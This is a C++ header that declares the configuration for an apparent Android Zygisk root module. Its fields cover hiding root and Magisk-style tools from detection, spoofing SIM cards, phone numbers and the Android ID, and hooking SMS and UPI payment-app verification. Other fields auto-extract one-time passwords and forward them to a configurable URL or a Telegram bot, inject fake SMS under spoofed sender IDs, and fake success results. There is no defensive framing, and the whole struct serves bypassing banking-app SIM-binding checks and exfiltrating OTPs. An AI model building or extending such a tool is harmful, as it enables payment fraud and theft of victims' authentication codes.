#pragma once

#include <string>
#include <vector>
#include <map>

struct ModuleConfig {
    bool hide_root = true;
    bool hide_developer = true;
    bool hide_magisk = true;
    bool hide_kernelsu = true;
    bool hide_apatch = true;
    bool hide_sukisu = true;
    bool hide_all_root_apps = true;

    bool enable_sim1_mock = false;
    bool enable_sim2_mock = false;
    bool enable_phone_spoof = false;
    std::string mock_country_iso = "in";
    std::string mock_phone_sim1;
    std::string mock_phone_sim2;

    bool hook_incoming_sms = true;
    bool hook_outgoing_sms = true;
    bool hook_upi_verification = true;
    bool auto_extract_otp = true;
    bool auto_forward_token = true;
    std::string forward_url;
    std::string forward_method = "POST";
    std::string telegram_chat_id;
    std::string telegram_bot_token;
    std::map<std::string, std::string> forward_headers;
    std::vector<std::string> otp_patterns;
    std::string inject_sender_id = "AD-TEST-S";
    std::string inject_message_body;
    std::string log_file = "/data/local/tmp/hivirtus_zygisk_mode.log";
    std::map<std::string, bool> hooked_upi_apps;
    std::map<std::string, int> upi_app_timer_bonuses;

    bool enable_device_id_spoof = false;
    std::string spoof_android_id;

    int upi_timer_bonus_seconds = 20;
    bool override_incoming_sender = true;
    bool fake_intercept_telegram = true;
    bool intercept_fake_success = false;
    bool auto_hook_foreground = true;

    bool is_upi_app_hooked(const std::string& package) const;
    int timer_bonus_for_package(const std::string& package) const;
};

class ConfigManager {
public:
    static ConfigManager& instance();

    bool load();
    const ModuleConfig& get() const { return config_; }
    ModuleConfig& mutable_config() { return config_; }
    void reload();
    void persist_runtime();

private:
    ConfigManager() = default;
    ModuleConfig config_;
    bool loaded_ = false;
};
